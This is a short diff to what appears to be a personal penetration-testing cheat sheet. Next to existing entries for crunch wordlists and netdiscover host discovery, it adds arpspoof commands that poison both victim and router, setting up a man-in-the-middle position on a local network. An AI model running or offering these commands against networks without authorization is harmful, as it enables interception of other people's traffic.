@@ -62,3 +62,9 @@ crunch <min><max> <characters_set> [-t <pattern>] [-o <filename>]
 
 ->Discover all devices connected to your network
 netdiscover -r <inet_ip>/24
+
+
+-> ARP Spoofing 
+arp -a
+arpspoof -i <interface> -t <target_victim> <target_router>
+arpspoof -i <interface> -t <target_router> <target_victim>
